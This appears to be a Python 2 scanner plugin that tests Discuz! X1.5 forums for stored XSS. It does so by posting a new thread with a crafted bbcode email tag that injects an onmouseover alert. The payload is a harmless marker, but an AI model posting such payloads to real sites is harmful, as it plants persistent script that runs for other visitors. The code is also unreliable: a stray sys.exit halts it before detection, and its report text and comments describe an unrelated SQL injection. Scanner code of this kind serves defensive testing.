# -*- coding: utf-8 -*-
'''
本插件针对 DiscuzX1.5 的 因bbcode导致的 存储型xss 漏洞进行检测
author: lidq
created: 20161213
'''

# 导入SQL注入通用库，本插件是SQL注入基础插件，故写在通用库中
# 导入url请求公用库
from engine.engine_utils.InjectUrlLib import *

from engine.engine_utils.common import *
# 导入日志处理句柄
from engine.logger import scanLogger as logger
# 导入默认的header头
from engine.engine_utils.params import dict2query


def run_domain(http, config):
    '''
    重写run_url函数，实现检测SQL注入的功能
    有异常时，直接输出异常
    无异常时，以list类型返回检测结果记录
    '''

    # 重新组织请求的参数
    scanInfo = {}
    scanInfo['siteId'] = config['siteId']
    scanInfo['ip'] = config['ip']
    scanInfo['scheme'] = config['scheme']
    scanInfo['domain'] = config['domain']
    scanInfo['level'] = config['level']
    scanInfo['vulId'] = config['vulId']
    # headers = headerDictDefault
    headers = {
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0',
        #    'Host': 'discuzx15.target.safety.local.com',
        'Cache-Control': 'max-age=0',
        'Host': config['domain']
    }
    headers['cookie'] = config['cookie']

    # print scanInfo
    responseList = []
    try:
        source_ip = config.get('source_ip')
        if source_ip:
            urlBase = scanInfo['scheme'] + "://" + source_ip
        else:
            urlBase = scanInfo['scheme'] + "://" + scanInfo['domain']

        urlForum = urlBase + "/forum.php"
        response = request(url=urlForum, headers=headers, method="GET")
        # 状态码不正确，退出
        if response['httpcode'] != 200:
            return []
        # patternForumid = re.compile(r'<td\sclass\="fl_icn"\s*><a\shref\=".*?mod\=forumdisplay&fid\=(.*?)"', re.I|re.M|re.S)
        patternForumid = re.compile(r'<a\shref\=".*?mod\=forumdisplay&fid\=(.*?)"', re.I | re.M | re.S)
        tmpResult = patternForumid.findall(response['response_body'])
        # print response['response_body']
        # print response['response_headers']
        # 没有找到相应的版块，程序退出
        if not tmpResult:
            return []
        forumids = list(set(tmpResult))
        forumid = forumids[0]

        newthreadUrl = urlBase + "/forum.php?mod=post&action=newthread&fid=" + forumid
        headers['Referer'] = urlBase + "/forum.php?mod=forumdisplay&fid=" + forumid
        response = request(url=newthreadUrl, headers=headers, method="GET")
        # print response['httpcode']
        if response['httpcode'] != 200:
            return []
        print response['response_body']
        # print len(newthreadUrl), newthreadUrl
        # print headers
        # print response['httpcode']
        # patternForumhash = re.compile(r'<input.*?name\="formhash"\sid\="formhash"\svalue\="(.*?)"', re.I|re.M|re.S)
        # patternPosttime = re.compile(r'<input.*?name\="posttime"\sid\="posttime"\svalue\="(.*?)"', re.I|re.M|re.S)
        # tmpForumhash = patternForumhash.findall(response['response_body'])
        # tmpPosttime = patternPosttime.findall(response['response_body'])
        tmpForumhash = re.compile(r'<input.*?name\="formhash"\sid\="formhash"\svalue\="(.*?)"',
                                  re.I | re.M | re.S).findall(response['response_body'])
        tmpPosttime = re.compile(r'<input.*?name\="posttime"\sid\="posttime"\svalue\="(.*?)"',
                                 re.I | re.M | re.S).findall(response['response_body'])
        # tmpTid = re.compile(r'<input\s+type="hidden"\s+name\="tid"\s+value\="(.*?)"', re.I|re.M|re.S).findall(response['response_body'])
        # patternTid = re.compile(r'name\="tid"\svalue\="(.*?)"', re.I|re.M|re.S)
        # patternTid = re.compile(r'"tid"\s*value\="(.*?)"', re.I)
        # tmpTid = patternTid.findall(response['response_body'])
        # tmpPid = re.compile(r'<input\s+type="hidden"\s+name\="pid"\s+value\="(.*?)"', re.I|re.M|re.S).findall(response['response_body'])
        # tmpPage = re.compile(r'<input\s+type="hidden"\s+name\="page"\s+value\="(.*?)"', re.I|re.M|re.S).findall(response['response_body'])
        print tmpForumhash
        print tmpPosttime
        # print tmpTid
        # print tmpPid
        # print tmpPage
        # sys.exit(1)

        formdata = {}
        formdata['forumhash'] = tmpForumhash[0]
        formdata['posttime'] = tmpPosttime[0]
        formdata['subject'] = '这里是测试xss_bbcode帖子'
        formdata['message'] = '[email=2"onmouseover="alert(\'tester_xss_bbcode\')]2[/email]'
        formdata['wysiwyg'] = '1'
        formdata['fid'] = forumid
        # formdata['tid'] = tmpTid[0]
        # formdata['pid'] = tmpPid[0]
        # formdata['page'] = tmpPage[0]
        formdata['checkbox'] = 0
        postUrl = urlBase + "/forum.php?mod=post&action=newthread&fid=" + forumid + "&extra=&topicsubmit=yes"
        body = dict2query(formdata)
        headers['Referer'] = newthreadUrl
        response = request(url=postUrl, body=body, headers=headers, method="POST")
        # print response
        if response['httpcode'] != 200:
            return []
        print response['response_body']
        sys.exit(1)
        patternEdit = re.compile(r'<a\sclass\="editp"\shref\s="(.*?)">编辑<\/a>', re.I | re.M | re.S)
        patternEdit.findall(response['response_body'])
        response = request(url=postUrl, headers=headers, method="GET")
        patternXssBbcode = re.compile(r'alert\(\'tester_xss_bbcode\'\)', re.I | re.M | re.S)
        match = patternXssBbcode.match(response['response_body'])
        if match:
            injectInfo = returnInjectResult(url=urlBase, confirm=1,
                                            detail="Discuz! X1-1.5 的 notify_credit.php 文件由于没有对用户输入进行有效的过滤导致存在SQL盲注",
                                            response=response)
            responseList.append(getRecord2(scanInfo, injectInfo))
            return responseList

    except Exception, e:
        logger.error("File:DiscuzX15_notify_credit.py:" + str(e))
    return responseList


def saveHtml(filename='', content=''):
    fp = open(filename, 'w')
    fp.write(content)
    fp.close()
